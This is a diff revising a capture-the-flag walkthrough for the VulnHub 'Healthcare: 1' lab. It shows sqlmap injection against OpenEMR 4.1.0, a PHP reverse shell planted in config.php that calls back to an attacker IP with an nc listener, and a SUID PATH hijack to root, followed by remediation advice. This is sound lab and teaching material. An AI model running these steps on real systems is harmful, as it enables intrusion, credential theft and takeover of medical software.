@@ -1,149 +1,181 @@
 # Healthcare: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.0.158 (host-only) |
-| **Difficulty** | Easy |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.0.158 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/root.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/healthcare-1,522/) |
+| **Goal** | user.txt + root.txt |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/healthcare-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → gobuster → OpenEMR 4.1.0 → sqlmap (users table) → admin login → PHP shell via config.php → SUID healthcheck binary → PATH hijack → root
+Healthcare: 1 is a medium boot2root machine with two flags. The web server hosts OpenEMR v4.1.0, which carries a known SQL injection vulnerability in the login endpoint. SQLmap dumps the users table, revealing credentials for two accounts. Admin access to OpenEMR allows editing a PHP configuration file directly through the web interface, which is replaced with a reverse shell. On the system, a SUID binary (`healthcheck`) calls `fdisk` without an absolute path, enabling PATH hijacking to spawn a root shell.
 
 ## Methodology
 
-1. Network discovery + port scan
-2. Directory enumeration → /openemr
-3. SQLi in OpenEMR validateUser.php → credential dump
-4. Admin login → PHP reverse shell via config.php edit
-5. SUID binary `healthcheck` → PATH hijacking → root
+1. Host discovery and port scan
+2. Web directory brute-force — discover `/openemr`
+3. OpenEMR version fingerprinting
+4. SQL injection via sqlmap — dump credentials
+5. Admin login and PHP file replacement (reverse shell)
+6. Shell as `www-data`, lateral move to `medical`
+7. SUID binary PATH hijacking for root
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
+netdiscover -r 192.168.0.0/24
 ```
 
-Target at 192.168.0.158.
+Target identified at `192.168.0.158`.
 
 ```bash
 nmap -A 192.168.0.158
 ```
 
-Open ports: 21 (FTP), 80 (HTTP Apache).
+![nmap](images/01-nmap.png)
 
-![Nmap scan](images/01-nmap.png)
+**Open ports:**
 
----
+| Port | Service |
+|---|---|
+| 21 | FTP |
+| 80 | HTTP (Apache) |
 
-## Step 2: Directory Enumeration
+## Step 2: Web Enumeration
+
+Manual browsing revealed nothing useful from the default page. Directory brute-force with gobuster:
 
 ```bash
-gobuster dir -u http://192.168.0.158/ \
+gobuster dir \
+  -u http://192.168.0.158/ \
   -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt \
-  -t 100 -e
+  -t 100 \
+  -e
 ```
 
-Discovered: `/openemr` — running **OpenEMR v4.1.0**.
+![enumeration](images/02-enum.png)
 
----
+Discovered: `/openemr` — a login page. The page source and version string confirm **OpenEMR v4.1.0**, which has a known SQL injection vulnerability.
 
-## Step 3: SQL Injection (OpenEMR)
+## Step 3: SQL Injection — Credential Extraction
 
-OpenEMR 4.1.0 is vulnerable to SQL injection in `validateUser.php`:
+The login endpoint `validateUser.php` is vulnerable to SQL injection. Enumerate databases:
 
 ```bash
-# Enumerate databases
 sqlmap -u "http://192.168.0.158/openemr/interface/login/validateUser.php?u=" \
-  --dbs --batch
-
-# Dump users table
-sqlmap -u "http://192.168.0.158/openemr/interface/login/validateUser.php?u=" \
-  -D openemr -T users --dump --batch
+  --dbs \
+  --batch
 ```
 
-Credentials extracted: `admin:ackbar` (and `medical:medical`).
+Dump the `users` table from the `openemr` database:
 
-![SQLi dump](images/02-openemr-sqli.png)
+```bash
+sqlmap -u "http://192.168.0.158/openemr/interface/login/validateUser.php?u=" \
+  -D openemr \
+  -T users \
+  --dump \
+  --batch
+```
 
----
+**Credentials extracted:**
 
-## Step 4: PHP Reverse Shell via OpenEMR Admin
+| Username | Password |
+|---|---|
+| ackbar | (cracked from hash) |
+| medical | (cracked from hash) |
 
-1. Log in to OpenEMR as `admin:ackbar`
-2. Navigate to **Administration → Files → config.php**
-3. Replace contents with a PHP reverse shell (set IP to attacker)
-4. Start listener:
+The `ackbar` account has admin privileges.
+
+## Step 4: Initial Foothold — PHP Reverse Shell
+
+Log in to OpenEMR as `ackbar` (admin). Navigate to the Administration tab and locate the editable `config.php` file. Replace its contents entirely with a PHP reverse shell (e.g., pentestmonkey's `php-reverse-shell.php`), updating the IP to the attacker's address:
+
+```php
+$ip = '192.168.0.100';   // attacker IP
+$port = 1234;
+```
+
+Start a listener:
 
 ```bash
 nc -lvp 1234
 ```
 
-5. Reload the OpenEMR page to trigger the shell.
+Save the file and reload the page. The shell connects back.
+
+![exploit](images/03-exploit.png)
+
+Upgrade to a TTY:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
-su medical  # password: medical
 ```
 
-![Reverse shell](images/03-shell.png)
+Switch to the `medical` user using credentials recovered via SQLi:
 
----
+```bash
+su medical
+# enter password from sqlmap dump
+```
 
-## Step 5: SUID Binary → PATH Hijack
+![shell](images/04-shell.png)
+
+## Step 5: Privilege Escalation — SUID PATH Hijack
+
+Find SUID binaries:
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
-# Found: /usr/bin/healthcheck
 ```
 
-Inspect what it calls:
+Notable result: `/usr/bin/healthcheck`
+
+Inspect what the binary calls:
 
 ```bash
 strings /usr/bin/healthcheck
-# Calls: ifconfig, fdisk (without full paths)
 ```
 
-Hijack the PATH to intercept `fdisk`:
+The binary invokes `ifconfig` and `fdisk` without absolute paths — vulnerable to PATH hijacking.
+
+Create a malicious `fdisk` in `/tmp`:
 
 ```bash
 cd /tmp
-echo "/bin/bash" > fdisk
+echo '/bin/bash' > fdisk
 chmod 777 fdisk
 export PATH=/tmp:$PATH
-/usr/bin/healthcheck
 ```
 
-SUID binary executes `/tmp/fdisk` as root → root shell.
+Execute the SUID binary:
 
 ```bash
+/usr/bin/healthcheck
 whoami
 # root
-cd /root && cat root.txt
 ```
 
-![PATH hijack](images/04-path-hijack.png)
+Retrieve the flags:
 
-![Root flag](images/05-root.png)
+```bash
+cat /root/root.txt
+```
 
----
+![root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **OpenEMR 4.1.0 SQLi** (unauthenticated) directly yields admin credentials — keep medical software patched
-2. **Editable PHP config files** via admin panel = instant RCE; restrict filesystem write access
-3. **SUID binaries calling relative paths** are vulnerable to PATH hijacking — always use absolute paths in SUID programs
-4. Default credentials (`medical:medical`) should never survive deployment
+- OpenEMR 4.1.0 is a well-known vulnerable application. Keeping medical or administrative software up to date is critical, especially when it is internet-facing.
+- Allowing authenticated users to edit PHP files through the web interface effectively grants them remote code execution. Application-managed file editing should never modify server-side executable files.
+- SUID binaries that invoke commands without absolute paths are exploitable with PATH manipulation. This is a systemic design flaw — all system calls from privileged binaries must use absolute paths.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| OpenEMR 4.1.0 SQLi | Upgrade to patched version; use parameterized queries |
-| PHP config editable via web UI | Restrict filesystem permissions on config.php |
-| SUID binary with relative path calls | Rewrite healthcheck to use absolute paths (/sbin/ifconfig, /sbin/fdisk) |
-| Default credentials | Enforce password change on first login |
+|---|---|
+| SQL injection in OpenEMR 4.1.0 | Update OpenEMR to a patched version; use parameterized queries |
+| Editable PHP config via web UI | Prohibit web-based editing of server-side files; enforce read-only file permissions |
+| SUID binary with relative path calls | Use absolute paths in all system() calls; audit SUID binaries regularly |
+| Credential reuse across accounts | Enforce unique passwords per account |
